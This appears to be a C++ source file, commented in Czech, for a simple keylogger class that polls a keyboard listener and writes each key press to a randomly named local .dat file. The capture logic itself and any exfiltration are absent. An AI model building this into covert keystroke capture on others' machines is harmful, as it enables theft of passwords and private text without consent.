#include "KeyLogger.h"
#include <iostream>
#include <random>
#include <ctime>
#include <thread>

KeyLogger::KeyLogger(std::unique_ptr<KeyboardListener> listener)
    : running(false), keyboardListener(std::move(listener)) {}

KeyLogger::~KeyLogger() {
    stop();
}

std::string KeyLogger::generateRandomFileName() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(1000, 9999);

    return "log_" + std::to_string(dist(gen)) + ".dat";
}

void KeyLogger::start() {
    running = true;
    std::string fileName = generateRandomFileName();
    logFile.open(fileName, std::ios::app);

    if (!logFile.is_open()) {
        std::cerr << "Chyba: Nelze otevřít soubor pro logování!" << std::endl;
        return;
    }

    while (running) {
        char key = keyboardListener->getKeyPress();  // Zavolání metody z konkrétní implementace.
        if (key) {
            logKey(key);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Snížení zatížení CPU.
    }
}

void KeyLogger::stop() {
    running = false;
    if (logFile.is_open()) {
        logFile.close();
    }
}

void KeyLogger::logKey(char key) {
    if (logFile.is_open()) {
        logFile.put(key);
        logFile.flush();
    }
}